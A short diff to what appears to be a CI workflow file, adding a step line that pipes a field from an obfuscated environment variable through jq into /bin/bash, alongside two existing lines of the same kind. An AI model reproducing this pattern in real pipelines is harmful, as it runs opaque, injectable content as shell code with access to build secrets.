@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$esjs8" | jq -r .tgr5393 | /bin/bash
           printf '%s' "$medph13725" | jq -r .by83 | /bin/bash
+          echo $zla4759 | jq -r .txrt8173 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
